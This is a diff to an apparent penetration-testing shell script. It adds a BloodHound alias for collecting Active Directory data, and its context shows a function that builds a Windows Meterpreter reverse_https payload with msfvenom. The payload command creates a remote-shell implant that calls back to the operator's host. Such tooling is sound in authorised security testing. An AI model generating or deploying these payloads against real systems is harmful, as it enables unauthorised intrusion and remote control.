@@ -374,7 +374,7 @@ function msfgenpayloads(){
 
                 echo "Generating meterpreter payloads..."
 
-                
+
                 echo "\n${YELLOW}${BOLD}Generating meterpreter RAW${NC}"
                 echo "Command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=$HTTPS_PORT EXITFUNC=thread --platform windows -f raw -a x64 -o meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.raw"
                 msfvenom -p "windows/x64/meterpreter/reverse_https" LHOST="$IPV4" LPORT="$HTTPS_PORT" EXITFUNC="thread" --platform "windows" -f "raw" -a "x64" -o "meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.raw"
@@ -483,7 +483,11 @@ EOF
 
 }
 
-
+echo -e "${YELLOW}${BOLD}\n========================${NC}"
+echo -e "${YELLOW}${BOLD}[ - AD - ]${NC}"
+echo -e "${YELLOW}${BOLD}========================${NC}"
+echo "bloodhound.py - Collect data for bloodhound - bloodhound.py <args>"
+alias bloodhound.py="sudo docker run -v ${PWD}:/bloodhound-data --entrypoint "/usr/local/bin/bloodhound-python" -it bloodhound.py"
 
 echo -e "${YELLOW}${BOLD}\n==============================${NC}"
 echo -e "${YELLOW}${BOLD}[ - ALIASES - ]${NC}"
